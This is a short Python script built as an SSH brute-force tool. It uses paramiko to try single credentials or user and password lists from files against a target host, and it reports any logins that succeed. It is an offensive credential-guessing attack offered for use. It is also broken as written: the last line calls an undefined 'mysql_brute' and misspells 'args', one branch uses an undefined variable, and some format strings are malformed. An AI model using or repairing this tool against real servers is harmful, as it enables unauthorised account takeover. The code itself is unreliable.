import paramiko
import argparse
import colorama
import os
from colorama import Fore, Back, Style

colorama.init(autoreset=True)

def ssh_login(host="", user="", passwd="", verbose=False):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		res = client.connect(host, username=user, password=passwd)
		client.close()
		print(f"{Fore.GREEN}[+] Found:" , user, ":" , passwd, "{Fore.RESET}")

	except:
		if verbose != False:
			print(f"{Fore.RED}[-] Failed:", user, ":", passwd, "{Fore.RESET}")

def ssh_brute(user="", userlist="", password="", passwordlist="", verbose=False, host=""):
	if user != None and password != None:
		ssh_login(host=host, user=user, passwd=passwd, verbose=verbose)

	elif user != None and passwordlist != None:
		file = open(passwordlist)
		passwords = file.readlines()
		for passw in passwords:
			ssh_login(host=host, user=user, passwd=passw, verbose=verbose)

	elif userlist != None and password != None:
		file = open(userlist)
		users = file.readlines()
		for usr in users:
			ssh_login(host=host, user=usr, passwd=password, verbose=verbose)

	elif userlist != None and passwordlist != None:
		file1 = open(userlist)
		users = file1.readlines()
		file2 = open(passwordlist)
		passwords = file2.readlines()
		for usr in users:
			for passw in passwords:
				ssh_login(host=host, user=usr, passwd=passw, verbose=verbose)

	else:
		pass


argument_parser = argparse.ArgumentParser(description='SSH brute force')
argument_parser.add_argument("-u", required=False, type=str, help='single user')
argument_parser.add_argument("-U", required=False, type=str, help='user from file')
argument_parser.add_argument("-p", required=False, type=str, help='single password')
argument_parser.add_argument("-P", required=False, type=str, help='password from file')
argument_parser.add_argument("-v", required=False, action='store_true', help='verbose')
argument_parser.add_argument("-H", required=True, type=str, help='host')
args = argument_parser.parse_args()

mysql_brute(user=args.u, userlist=args.U, password=args.p, passwordlist=arsg.P, verbose=args.v, host=args.H)
